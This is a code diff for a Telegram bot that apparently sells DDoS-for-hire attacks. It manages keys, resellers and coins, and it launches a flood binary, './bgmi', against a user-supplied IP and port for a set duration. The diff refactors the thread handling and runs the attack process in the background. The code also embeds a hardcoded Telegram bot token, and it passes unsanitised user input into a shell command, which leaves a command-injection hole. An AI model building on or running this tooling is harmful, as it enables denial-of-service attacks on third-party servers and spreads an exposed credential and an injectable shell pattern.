@@ -2,7 +2,6 @@ import os
 import time
 import logging
 import asyncio
-import multiprocessing
 from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
 from telegram.helpers import escape_markdown
@@ -21,7 +20,6 @@ logging.basicConfig(
 TELEGRAM_BOT_TOKEN = '7064980384:AAGfNFTaf81DF3P4NLhHm0TRBSEV1XfBATw'  # Replace with your bot token
 OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)
 ALLOWED_GROUP_ID = -1002295161013  # Replace with your allowed group ID
-MAX_THREADS = 1500  # Default max threads
 max_duration = 150  # Default max attack duration
 DEFAULT_THREADS = 1000  # Default threads value for attacks
 
@@ -79,7 +77,7 @@ reseller_markup = ReplyKeyboardMarkup(reseller_keyboard, resize_keyboard=True)
 # Custom Keyboard for Owner
 owner_keyboard = [
     ['Start', 'Attack', 'Redeem Key'],
-    ['Rules', 'Set Duration', 'Set Threads'],
+    ['Rules', 'Set Duration'],
     ['Generate Key', 'Keys', 'Delete Key'],
     ['Add Reseller', 'Remove Reseller', 'Add Coin'],
     ['Set Cooldown']  # New button for setting global cooldown
@@ -91,13 +89,12 @@ GET_DURATION = 1
 GET_KEY = 2
 GET_ATTACK_ARGS = 3
 GET_SET_DURATION = 4
-GET_SET_THREADS = 5
-GET_DELETE_KEY = 6
-GET_RESELLER_ID = 7
-GET_REMOVE_RESELLER_ID = 8
-GET_ADD_COIN_USER_ID = 9
-GET_ADD_COIN_AMOUNT = 10
-GET_SET_COOLDOWN = 11  # New state for setting cooldown
+GET_DELETE_KEY = 5
+GET_RESELLER_ID = 6
+GET_REMOVE_RESELLER_ID = 7
+GET_ADD_COIN_USER_ID = 8
+GET_ADD_COIN_AMOUNT = 9
+GET_SET_COOLDOWN = 10  # New state for setting cooldown
 
 # Load key data from file
 def load_keys():
@@ -292,9 +289,6 @@ async def attack_input(update: Update, context: CallbackContext):
     ip, port, duration = args
     duration = int(duration)
 
-    # Use the default threads value
-    threads = DEFAULT_THREADS
-
     if duration > max_duration:
         await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
         return ConversationHandler.END  # Terminate the conversation
@@ -306,18 +300,25 @@ async def attack_input(update: Update, context: CallbackContext):
         f"⚔️ *Attack Started!*\n"
         f"🎯 *Target*: {ip}:{port}\n"
         f"🕒 *Duration*: {duration} sec\n"
-        f"🧵 *Threads*: {threads} (default)\n"
+        f"🧵 *Threads*: {DEFAULT_THREADS} (default)\n"
         f"🔥 *Let the battlefield ignite! 💥*",
         parse_mode='Markdown'
     )
 
-    # Execute the external binary asynchronously
+    # Execute the external binary asynchronously with 4 arguments
     process = await asyncio.create_subprocess_shell(
-        f"./bgmi {ip} {port} {duration} {threads}",
+        f"./bgmi {ip} {port} {duration} {DEFAULT_THREADS}",
         stdout=asyncio.subprocess.PIPE,
         stderr=asyncio.subprocess.PIPE
     )
 
+    # Wait for the process to complete in the background
+    asyncio.create_task(handle_attack_process(process, update, ip, port, duration))
+
+    return ConversationHandler.END
+
+# Handle the attack process in the background
+async def handle_attack_process(process, update: Update, ip: str, port: str, duration: int):
     # Wait for the process to complete
     stdout, stderr = await process.communicate()
 
@@ -327,7 +328,7 @@ async def attack_input(update: Update, context: CallbackContext):
             f"✅ *Attack Finished!*\n"
             f"🎯 *Target*: {ip}:{port}\n"
             f"🕒 *Duration*: {duration} sec\n"
-            f"🧵 *Threads*: {threads} (default)\n"
+            f"🧵 *Threads*: {DEFAULT_THREADS} (default)\n"
             f"🔥 *The battlefield is now silent.*",
             parse_mode='Markdown'
         )
@@ -336,12 +337,10 @@ async def attack_input(update: Update, context: CallbackContext):
             f"❌ *Attack Failed!*\n"
             f"🎯 *Target*: {ip}:{port}\n"
             f"🕒 *Duration*: {duration} sec\n"
-            f"🧵 *Threads*: {threads} (default)\n"
+            f"🧵 *Threads*: {DEFAULT_THREADS} (default)\n"
             f"💥 *Error*: {stderr.decode().strip()}",
             parse_mode='Markdown'
         )
-
-    return ConversationHandler.END
 
 # Set Cooldown Command - Start Conversation
 async def set_cooldown_start(update: Update, context: CallbackContext):
@@ -407,26 +406,6 @@ async def set_duration_input(update: Update, context: CallbackContext):
     try:
         max_duration = int(update.message.text)
         await update.message.reply_text(f"✅ *Maximum attack duration set to {max_duration} seconds!*", parse_mode='Markdown')
-    except ValueError:
-        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
-        return ConversationHandler.END  # Terminate the conversation
-    return ConversationHandler.END
-
-# Set Threads Command - Start Conversation
-async def set_threads_start(update: Update, context: CallbackContext):
-    if not is_owner(update):
-        await update.message.reply_text("❌ *Only the owner can set max threads!*", parse_mode='Markdown')
-        return ConversationHandler.END
-
-    await update.message.reply_text("⚠️ *Enter the maximum number of threads.*", parse_mode='Markdown')
-    return GET_SET_THREADS
-
-# Set Threads Command - Handle Threads Input
-async def set_threads_input(update: Update, context: CallbackContext):
-    global MAX_THREADS
-    try:
-        MAX_THREADS = int(update.message.text)
-        await update.message.reply_text(f"✅ *Maximum threads set to {MAX_THREADS}!*", parse_mode='Markdown')
     except ValueError:
         await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
         return ConversationHandler.END  # Terminate the conversation
@@ -605,8 +584,6 @@ async def handle_button_click(update: Update, context: CallbackContext):
         await attack_start(update, context)
     elif query == 'Set Duration':
         await set_duration_start(update, context)
-    elif query == 'Set Threads':
-        await set_threads_start(update, context)
     elif query == 'Generate Key':
         await generate_key_start(update, context)
     elif query == 'Redeem Key':
@@ -689,14 +666,6 @@ def main():
         fallbacks=[CommandHandler("cancel", cancel_conversation)],
     )
 
-    set_threads_handler = ConversationHandler(
-        entry_points=[CommandHandler("set_threads", set_threads_start), MessageHandler(filters.Text("Set Threads"), set_threads_start)],
-        states={
-            GET_SET_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_threads_input)],
-        },
-        fallbacks=[CommandHandler("cancel", cancel_conversation)],
-    )
-
     delete_key_handler = ConversationHandler(
         entry_points=[CommandHandler("deletekey", delete_key_start), MessageHandler(filters.Text("Delete Key"), delete_key_start)],
         states={
@@ -743,7 +712,6 @@ def main():
     application.add_handler(redeem_key_handler)
     application.add_handler(attack_handler)
     application.add_handler(set_duration_handler)
-    application.add_handler(set_threads_handler)
     application.add_handler(delete_key_handler)
     application.add_handler(add_reseller_handler)
     application.add_handler(remove_reseller_handler)
